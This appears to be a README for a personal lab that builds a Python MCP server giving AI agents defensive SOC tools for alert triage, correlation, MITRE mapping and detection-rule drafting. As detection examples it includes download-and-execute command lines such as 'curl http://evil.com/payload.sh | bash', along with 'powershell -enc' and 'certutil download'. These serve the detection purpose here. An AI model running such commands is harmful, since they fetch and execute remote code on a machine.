# AI Agent MCP Lab

A hands-on cybersecurity and AI engineering lab focused on learning how AI Agents, the Model Context Protocol (MCP), and custom security tooling can be used to automate and enhance Security Operations Center (SOC) investigations.

This project demonstrates how AI agents can move beyond simple chat interactions by using MCP tools to perform structured security workflows, triage alerts, generate investigations, recommend actions, and assist analysts during incident response.

---

# Portfolio Highlights

This project demonstrates:

- Custom Python MCP Server Development
- AI Agent Tool Orchestration
- Security Workflow Automation
- Wazuh Alert Parsing and Analysis
- MITRE ATT&CK Mapping
- Detection Engineering Concepts
- Microsoft Defender Query Generation
- Azure Sentinel Query Generation
- IBM QRadar AQL Detection Generation
- Analyst Decision Support
- AI-Assisted SOC Investigations
- AI-Assisted Investigation Runbook Generation
- Multi-Alert Correlation
- AI-Assisted Attack Chain Analysis
- Security Copilot-Style Investigation Chains
- End-to-End Incident Investigation Orchestration
- AI-Assisted Incident Report Generation
- SOC and Executive Incident Reporting
- Observable Enrichment
- Threat Context Generation

Key capabilities include:

- Alert Classification and Routing
- SSH Authentication Failure Investigations
- Suspicious Command Execution Investigations
- Multi-Alert Correlation
- AI-Assisted Attack Chain Analysis
- Security Copilot-Style Investigation Chains
- End-to-End Incident Investigation Orchestration
- AI-Assisted Incident Report Generation
- SOC and Executive Incident Reporting
- Observable Enrichment
- Threat Context Generation
- Investigation Summary Generation
- AI-Assisted Investigation Runbook Generation
- Security Ticket Generation
- Analyst Action Recommendations
- Security Query Generation

---

# Project Goals

This lab focuses on:

- Learning AI Agent fundamentals
- Understanding MCP architecture
- Building custom MCP servers with Python
- Creating AI-assisted security workflows
- Practicing SOC investigation automation
- Developing reusable security tooling
- Exploring Detection Engineering concepts
- Understanding how AI can support cybersecurity operations

Rather than building a large infrastructure environment, this project focuses on practical AI engineering concepts that can be applied to real-world cybersecurity operations.

---

# Learning Objectives

By completing this lab, I learned:

- What AI agents are
- How MCP works
- How AI models interact with tools
- How to build custom MCP servers
- How to expose Python functions as MCP tools
- How tool orchestration differs from traditional automation
- How AI can assist SOC investigations
- How to structure security workflows using AI
- How to build alert routing workflows
- How to integrate MITRE ATT&CK mappings into investigations

---

# MCP Concepts Learned

## Traditional AI Chat

```text
User
  ↓
AI Model
  ↓
Response
```

The model can only reason about information provided in the conversation.

---

## AI Agent + MCP

```text
User
  ↓
AI Model
  ↓
MCP Tool Calls
  ↓
External Data / Functions
  ↓
Response
```

MCP allows AI models to use tools instead of relying only on conversation context.

---

# Current Architecture

Alert
↓
Investigation Workflow
↓
Investigation Summary
↓
Recommended Queries
↓
Next Action Recommendation
↓
Detection Recommendation
↓
SOC Investigation Package

````

---

# Example Investigation Flow

```text
Wazuh Alert
    ↓
identify_alert_type
    ↓
investigate_ssh_alert
    ↓
parse_wazuh_alert
    ↓
score_ssh_alert
    ↓
generate_investigation_summary
    ↓
generate_wazuh_query
    ↓
generate_defender_kql
    ↓
recommend_next_action
    ↓
generate_soc_ticket_note
````

---

# Project Structure

```text
ai-agent-mcp-lab/
├── .cursor/
│   ├── mcp.json
│   └── rules/
│       └── ai-agent-lab.mdc
├── docs/
│   └── project_context.md
├── notes/
│   └── lab_journal.md
├── sample_data/
│   ├── wazuh_alert.json
│   └── command_execution_alert.json
├── scripts/
│   └── soc_mcp_server.py
├── .gitignore
├── LICENSE
└── README.md
```

---

# Custom MCP Server

This project includes a custom Python MCP server:

```text
soc-assistant
```

Built using:

```text
Python
MCP Python SDK
Cursor
```

The MCP server exposes security-focused tools that can be called directly by AI agents.

---

# Current MCP Tools

## Alert Routing

### identify_alert_type

Purpose:

Classify incoming Wazuh alerts and route them to the appropriate investigation workflow.

Supported Alert Types:

| Alert Type                   | Workflow                      |
| ---------------------------- | ----------------------------- |
| ssh_auth_failure             | investigate_ssh_alert         |
| suspicious_command_execution | investigate_command_execution |
| unknown                      | manual_review                 |

---

## Investigation Workflows

### investigate_ssh_alert

Purpose:

Perform end-to-end triage for SSH authentication failures.

Returns:

- Alert Summary
- Risk Score
- Investigation Summary
- Recommended Queries
- Next Action
- Investigation Runbook

Workflow:

```text
Parse Alert
↓
Score Alert
↓
Generate Investigation Summary
↓
Generate Queries
↓
Recommend Next Action
↓
Return Investigation Package
```

---

### investigate_command_execution

Purpose:

Investigate suspicious command execution activity.

Supported Indicators:

- curl
- wget
- powershell
- certutil
- encoded commands
- bash execution
- download-and-execute patterns

Example:

```bash
curl http://evil.com/payload.sh | bash
```

Outputs:

- Command Summary
- Suspicious Indicators
- MITRE ATT&CK Mapping
- Severity
- Confidence Score
- Priority
- Recommended Queries
- Recommended Actions
- Analyst Notes
- Investigation Runbook

---

## Event Correlation

### correlate_security_events

Purpose:

Correlate multiple investigation findings and identify potential attack chains across SSH failures, Linux auth activity, and suspicious command execution events.

Inputs:

- `events` (list of dicts) — each event may include:
  - `event_type`
  - `timestamp`
  - `source_ip`
  - `host`
  - `username`
  - `severity`
  - `confidence_score`
  - `description`

Example event:

```json
{
  "event_type": "ssh_auth_failure",
  "timestamp": "2026-06-20T01:00:00Z",
  "source_ip": "192.168.1.50",
  "host": "ubuntu-agent",
  "username": "root",
  "severity": "high",
  "confidence_score": 80,
  "description": "Repeated SSH authentication failures"
}
```

Outputs:

- Attack Timeline
- Possible Attack Chain
- MITRE Mapping
- Correlation Summary
- Risk Assessment (`risk_level`, `confidence_score`)
- Recommended Actions (`recommended_next_steps`, `escalation_recommendation`)
- Detection Gaps
- Analyst Note

Correlation rules include shared source IP, shared host, SSH failure → auth activity → command execution sequences, and multi-event confidence/risk scoring. Uses simple deterministic logic only (no machine learning, API calls, or external lookups).

Example output fields:

```json
{
  "status": "ok",
  "correlation_summary": "Rule 1: The same source IP appears across multiple correlated events. ...",
  "possible_attack_chain": [
    "Initial Access",
    "Valid Accounts",
    "Command Execution"
  ],
  "mitre_mapping": [
    {"technique_id": "T1110", "name": "Brute Force"},
    {"technique_id": "T1078", "name": "Valid Accounts"},
    {"technique_id": "T1059", "name": "Command and Scripting Interpreter"}
  ],
  "risk_level": "high",
  "confidence_score": 100,
  "escalation_recommendation": "Escalate promptly and review containment options for the correlated activity."
}
```

Example Workflow:

```text
SSH Authentication Failure
↓
Linux Auth Activity
↓
Suspicious Command Execution
↓
correlate_security_events
↓
Attack Chain Analysis
↓
Escalation Recommendation
```

---

## Security Copilot Orchestration

### investigate_security_incident

Purpose:

Run an end-to-end investigation workflow using existing MCP tools. Chains alert classification, investigation, correlation, runbook generation, detection packaging, and ticket documentation into a single Security Copilot-style incident package.

Supported input types:

| Input Type         | Description                                              |
| ------------------ | -------------------------------------------------------- |
| wazuh_alert        | Wazuh alert JSON file path (SSH workflow chained today)  |
| command_execution  | Suspicious command string with optional host/user/IP     |
| event_collection   | List of normalized security events for correlation       |

Example workflows:

```text
Wazuh Alert
↓
identify_alert_type
↓
investigate_ssh_alert
↓
generate_detection_package
↓
generate_soc_ticket_note
↓
Incident Package
```

```text
Command Execution
↓
investigate_command_execution
↓
generate_investigation_runbook
↓
generate_detection_package
↓
Incident Package
```

```text
Event Collection
↓
correlate_security_events
↓
Attack Chain Analysis
↓
Recommended Runbooks
↓
Incident Package
```

Outputs:

- Incident summary
- Alert classification (when applicable)
- Investigation or correlation results
- Runbook(s)
- Detection package (when applicable)
- Ticket note or analyst documentation guidance
- Recommended next steps
- Analyst note

No API calls, SSH commands, or external lookups are performed. This tool orchestrates other MCP tools only.

---

## Incident Reporting

### generate_incident_report

Purpose:

Generate a structured SOC, executive, or technical incident report from investigation or correlation results.

Supported report types:

```text
soc
executive
technical
```

Example workflow:

```text
investigate_security_incident
↓
generate_incident_report
↓
SOC / Executive / Technical Report
```

Outputs:

- Executive Summary
- Technical Summary
- Incident Timeline
- MITRE Mapping
- Risk Assessment
- Containment Recommendations
- Detection Opportunities
- Lessons Learned

Accepts output from `investigate_security_incident`, `investigate_ssh_alert`, `investigate_command_execution`, or `correlate_security_events`. Unsupported `report_type` values default to `soc`. No API calls, SSH commands, external lookups, or file writes are performed. This tool formats and summarizes data already passed into it. Technical reports include `enriched_observables` when source IPs are available.

---

## Observable Enrichment

### enrich_observable

Purpose:

Provide investigation context for common observables using deterministic local heuristics.

Supported types:

```text
ip
domain
url
hash
email
```

Example workflow:

```text
Alert
↓
Investigation
↓
Observable Enrichment
↓
Correlation
↓
Incident Report
```

Outputs:

- Observable summary
- Reputation classification
- Risk level
- Related MITRE techniques (when applicable)
- Investigation recommendations
- Analyst notes

Unsupported observable types return `{"status": "error"}`. No API calls, web requests, or external threat intelligence feeds are used. This tool is also referenced from `investigate_command_execution`, `correlate_security_events`, and technical `generate_incident_report` output when observables are available.

---

## Investigation Helpers

### parse_wazuh_alert

Extracts observables from Wazuh alerts:

- Source IP
- Source Port
- User
- Host
- Rule ID
- Rule Description
- Decoder
- Raw Log

---

### parse_linux_auth_log

Purpose:

Parse a local Linux SSH/auth log sample and extract failed and successful login events.

Reads files from the lab directory only (no SSH commands, no API calls).

Outputs:

- Event counts
- Failed login events
- Successful login events
- Unique source IPs
- Unique users
- Summary and analyst note

Example path:

```text
sample_data/aihost_auth.log
```

---

### analyze_linux_auth_activity

Purpose:

Analyze parsed Linux SSH/auth log activity from a local telemetry sample and produce SOC-style triage guidance.

Reuses `parse_linux_auth_log` parsing logic.

Outputs:

- Risk level (low / medium / high)
- Confidence score (0–100)
- Findings
- Recommended actions
- Analyst notes
- Parsed activity summary
- Investigation runbook

Scoring factors include:

- Failed login volume (≥10 adds confidence)
- Success-after-failure from the same source IP
- Multiple source IPs
- Publickey-only successful logins with zero failures (reduces confidence)

---

### get_system_inventory

Purpose:

Collect system inventory and uptime data from aihost using safe SSH commands.

Inputs:

- `host` (string, default: `"aihost"`)

Outputs:

- Hostname, OS, kernel, uptime, CPU, memory, disk, load averages
- Logged-in users and last boot time
- Summary and analyst note

Uses read-only SSH commands only (no API calls, no package installs).

---

### score_ssh_alert

Calculates:

- Severity
- Confidence
- Priority

Factors include:

- Root account targeting
- Failed login volume
- Success-after-failure activity
- Known administrative hosts

---

### generate_investigation_summary

Creates:

- Executive Summary
- Risk Assessment
- Recommended Actions
- Analyst Notes

---

### generate_investigation_runbook

Purpose:

Generate a reusable SOC investigation runbook based on alert type, severity, and confidence score. Returns structured JSON only (no API calls, SSH, or external lookups).

Inputs:

- `alert_type` (string)
- `severity` (string, default: `"medium"`)
- `confidence_score` (integer, default: `60`)

Supported alert types:

| Alert Type                   | Runbook focus                                              |
| ---------------------------- | ---------------------------------------------------------- |
| ssh_auth_failure             | Failed logins, brute force, success-after-failure, EDR/SIEM |
| suspicious_command_execution | Command review, MITRE mapping, download-and-execute        |
| linux_auth_activity          | Auth log counts, publickey validation, SSH hardening       |
| unknown                      | Observable collection, enrichment, classification        |

Outputs:

- Runbook title and purpose
- Required inputs for analysts
- Step-by-step investigation steps
- Escalation criteria
- Containment considerations
- Detection engineering opportunities
- Recommended MCP tools for follow-on work
- Ticket documentation guidance
- Analyst note

Example output fields:

```json
{
  "status": "ok",
  "runbook_title": "SSH Authentication Failure Investigation Runbook",
  "alert_type": "ssh_auth_failure",
  "investigation_steps": ["Review failed login events...", "..."],
  "recommended_mcp_tools": ["investigate_ssh_alert", "generate_wazuh_query"]
}
```

Cybersecurity career relevance:

- Runbook and playbook authoring for tier-1 and tier-2 SOC consistency
- Standardizing investigation steps across alert types
- Bridging alert triage with detection engineering follow-up
- AI-assisted SOC operations where agents produce analyst-ready workflows

---

### generate_soc_ticket_note

Creates analyst-ready documentation for:

- ServiceNow
- Jira
- IBM SOAR
- Incident Tracking Systems

Includes:

- Summary
- Observables
- Severity
- Analysis
- Recommended Actions
- Next Steps

---

### recommend_next_action

Provides analyst guidance based on:

- Severity
- Confidence
- Priority

Example recommendations:

| Confidence | Recommendation                        |
| ---------- | ------------------------------------- |
| 80+        | Escalate and begin containment review |
| 60-79      | Gather additional evidence            |
| <60        | Continue investigation                |

---

### generate_wazuh_query

Generates:

- OpenSearch JSON queries
- Wazuh Discover filters
- Investigation guidance

---

### generate_defender_kql

Generates:

- Microsoft Defender Advanced Hunting KQL
- Azure Sentinel Syslog KQL
- Investigation guidance

---

### generate_detection_recommendation

Purpose:

Recommend detection engineering improvements based on investigation findings.

Inputs:

- Alert Type
- Severity
- Confidence Score
- MITRE Techniques

Outputs:

- Detection Gaps
- Recommended Detections
- Telemetry Recommendations
- MITRE Coverage
- Engineering Notes

Examples:

SSH Authentication Failures:

- Brute-force correlation detections
- Success-after-failure detections
- Root login anomaly detections

Suspicious Command Execution:

- Download-and-execute detections
- PowerShell encoded command detections
- Certutil abuse detections
- Command-line monitoring recommendations

---

# Current Supported Alert Types

## SSH Authentication Failure

Examples:

```text
Failed password
sshd authentication failure
Brute force attempts
Root login attempts
```

Workflow:

```text
investigate_ssh_alert
```

---

## Suspicious Command Execution

Examples:

```text
curl http://evil.com | bash
wget payload.sh
powershell -enc
certutil download
```

Workflow:

```text
investigate_command_execution
```

### generate_sigma_rule

Generates beginner-friendly Sigma detection rule drafts from supported alert types.

Supported use cases:

- SSH authentication failures
- Suspicious command execution
- Linux download-and-execute behavior

Outputs:

- Sigma YAML rule draft
- MITRE ATT&CK tags
- False positive guidance
- Analyst notes

This tool does not deploy detections automatically. Rules should be reviewed, tested, tuned, and converted to the target SIEM format before production use.

### generate_qradar_aql_detection

Generates beginner-friendly IBM QRadar AQL detection rule drafts from supported alert types.

Inputs:

- Alert Type
- Severity
- MITRE Techniques (optional)

Supported alert types:

| Alert Type                   | Detection focus                                      |
| ---------------------------- | ---------------------------------------------------- |
| ssh_auth_failure             | Repeated failed SSH logins (brute-force)             |
| suspicious_command_execution | curl, wget, bash -c, encoded PowerShell commands |

Outputs:

- Rule name and description
- Severity
- MITRE ATT&CK mapping
- AQL query draft
- Analyst notes

This tool does not deploy detections automatically. Paste the AQL into QRadar Log Activity or use it as the basis for a Custom Rule after review and tuning.

### generate_detection_package

Bundles multiple detection engineering outputs into a single package.

Reuses:

- generate_detection_recommendation
- generate_sigma_rule
- generate_sentinel_analytic_rule
- generate_qradar_aql_detection

Outputs:

- Detection Recommendations
- Sigma Rule Draft
- Sentinel Analytic Rule Draft
- QRadar AQL Detection Draft
- Engineering Summary

Purpose:

Helps move from alert investigation to detection engineering by identifying detection gaps, recommending improved coverage, generating detection content, and providing implementation guidance.

Example Workflow:

```text
investigate_command_execution
↓
generate_detection_package
↓
Detection Recommendations
Sigma Rule
Sentinel Rule
QRadar AQL Rule
Engineering Summary
```

---

# Key Security Concepts Practiced

- Alert Triage
- Incident Prioritization
- Security Automation
- Detection Engineering
- Wazuh Investigations
- MITRE ATT&CK Mapping
- OpenSearch Query Development
- Microsoft Defender Hunting
- Azure Sentinel Hunting
- IBM QRadar AQL Detection
- AI-Assisted SOC Workflows
- MCP Tool Orchestration
- Security Workflow Routing

---

# Current Project Status

Completed:

✅ Custom Python MCP Server

✅ Wazuh Alert Parsing

✅ Alert Classification & Routing

✅ SSH Authentication Failure Workflow

✅ Suspicious Command Execution Workflow

✅ Severity & Confidence Scoring

✅ MITRE ATT&CK Mapping

✅ OpenSearch Query Generation

✅ Defender KQL Generation

✅ Sentinel Query Generation

✅ QRadar AQL Detection Generation

✅ Investigation Summary Generation

✅ SOC Ticket Note Generation

✅ Analyst Decision Recommendations

✅ Detection Engineering Recommendations

✅ Detection Recommendations Embedded in Investigation Workflows

✅ Real aihost telemetry parsing (`parse_linux_auth_log`, `analyze_linux_auth_activity`)

✅ AI-Assisted Investigation Runbook Generation

✅ Multi-Alert Correlation

✅ Security Copilot-Style Investigation Chains

✅ AI-Assisted Incident Report Generation

✅ Observable Enrichment & Threat Context

✅ Real system inventory and uptime collection from aihost

---

# Next Steps

Suggested future phases (SOC and detection engineering focus):

- Splunk SPL query generation for hunt and detection workflows
- Analyst decision review checklist
- Report export to Markdown
- Case management workflows

---

# Telemetry Samples

Real telemetry samples (for example `sample_data/aihost_*.log`) are listed in `.gitignore` and should **not** be committed to the repository. Keep local auth log exports on your machine for lab use only.

---

# Planned Future Enhancements

- Malware Investigation Workflow
- PowerShell Investigation Workflow
- Privilege Escalation Workflow
- Persistence Detection Workflow
- Threat Intelligence Enrichment
- IOC Reputation Lookups
- Splunk SPL Query Generation
- Report Export to Markdown
- Integration with Future AI Security Labs

---

# Lessons Learned

The most important takeaway from this lab:

```text
AI reasons.
MCP tools perform actions.
Workflows combine tools into useful outcomes.
```

This project demonstrates how AI agents can augment security operations by combining reasoning, structured tooling, and repeatable workflows.

---

# Author

Sydney McGee

Cybersecurity Analyst | Security Automation Enthusiast | AI Security Engineering Learner

Current Focus:

- AI Agents
- MCP
- Security Automation
- Detection Engineering
- Security Engineering
- AI Security Engineering
- SOC Workflow Automation
